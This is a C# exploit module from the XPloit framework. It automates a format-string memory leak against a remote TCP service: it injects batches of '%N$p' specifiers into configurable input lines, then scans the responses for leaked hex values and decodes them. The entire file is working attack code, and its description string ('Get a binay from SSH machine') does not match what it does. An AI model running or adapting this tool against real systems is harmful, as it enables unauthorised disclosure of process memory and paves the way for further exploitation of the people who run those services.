using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Helpers;
using XPloit.Helpers.Attributes;

namespace Exploits.Multi.Netcat
{
    [ModuleInfo(Author = "Fernando Díaz Toledano", Description = "Get a binay from SSH machine")]
    public class PrintFormat : Module
    {
        const string InjectHere = "{InjectHere}";

        [ConfigurableProperty(Description = "Host")]
        public IPEndPoint Host { get; set; }
        [ConfigurableProperty(Description = "Encoding")]
        public Encoding Encoding { get; set; }

        [ConfigurableProperty(Description = "Line 1 - " + InjectHere + " for inject", Optional = true)]
        public string Line1 { get; set; }
        [ConfigurableProperty(Description = "Line 2 - " + InjectHere + " for inject", Optional = true)]
        public string Line2 { get; set; }
        [ConfigurableProperty(Description = "Line 3 - " + InjectHere + " for inject", Optional = true)]
        public string Line3 { get; set; }

        [ConfigurableProperty(Description = "From")]
        public int From { get; set; }
        [ConfigurableProperty(Description = "To")]
        public int To { get; set; }
        [ConfigurableProperty(Description = "Step")]
        public int Step { get; set; }
        [ConfigurableProperty(Description = "Verbose output")]
        public bool Verbose { get; set; }
        [ConfigurableProperty(Description = "Time between connections")]
        public TimeSpan WaitBetweenConnection { get; set; }
        [ConfigurableProperty(Description = "Wait for response")]
        public TimeSpan WaitForResponse { get; set; }

        List<byte> buffer = new List<byte>();
        Regex Hex = new Regex(@"0[xX][0-9a-fA-F]+");

        public PrintFormat()
        {
            Line1 = InjectHere;
            Line2 = "AAAA";
            From = 1;
            To = 100;
            Step = 5;

            WaitBetweenConnection = TimeSpan.FromSeconds(1);
            WaitForResponse = TimeSpan.FromSeconds(1);
            Encoding = Encoding.ASCII;
        }
        public override bool Run()
        {
            bool bret = false;

            for (int x = From; x < To;)
            {
                if (x != From) Thread.Sleep(WaitBetweenConnection);

                string inject = "";
                for (int y = 0; y < Step; y++, x++)
                    inject += @"%" + x.ToString() + "$p ";

                buffer.Clear();
                using (Socket tcp = new Socket(SocketType.Stream, ProtocolType.Tcp))
                {
                    tcp.Connect(Host);

                    string line;
                    foreach (string l in new string[] { Line1, Line2, Line3 })
                    {
                        if (string.IsNullOrEmpty(l)) continue;

                        Thread.Sleep(WaitForResponse);

                        while ((line = ReadLine(tcp)) != null)
                            if (WriteFromServer(line)) bret = true;

                        bool lc = l.Contains(InjectHere);
                        string send = l.Replace(InjectHere, inject);

                        tcp.Send(Encoding.GetBytes(send + "\n"));

                        if (Verbose || lc) WriteInfo("", send, ConsoleColor.Cyan);
                    }

                    Thread.Sleep(WaitForResponse);
                    while ((line = ReadLine(tcp)) != null)
                        if (WriteFromServer(line)) bret = true;
                }
                string ret = this.Encoding.GetString(buffer.ToArray());
                if (WriteFromServer(ret)) bret = true;
            }

            return bret;
        }
        bool WriteFromServer(string ret)
        {
            bool v = false;
            foreach (Match m in Hex.Matches(ret))
            {
                try
                {
                    string hv = m.Value;
                    if (hv.Length % 2 != 0) hv = hv.Insert(2, "0");

                    WriteInfo("", "\t" + m.Value + " = " + Encoding.GetString(HexHelper.FromHexString(hv)), ConsoleColor.Magenta);
                    v = true;
                }
                catch { }
            }
            if (Verbose || v) WriteInfo(ret);
            return v;
        }
        string ReadLine(Socket tcp)
        {
            while (tcp.Available > 0)
            {
                byte[] data = new byte[tcp.Available];
                tcp.Receive(data, 0, data.Length, SocketFlags.None);

                buffer.AddRange(data);
            }

            int ix = buffer.IndexOf(10);
            if (ix == -1) buffer.IndexOf(0);
            if (ix != -1)
            {
                byte[] line = buffer.ToArray();
                buffer.RemoveRange(0, ix + 1);

                line = line.Take(ix).Where(i => i != 0).ToArray();

                return Encoding.GetString(line);
            }
            return null;
        }
    }
}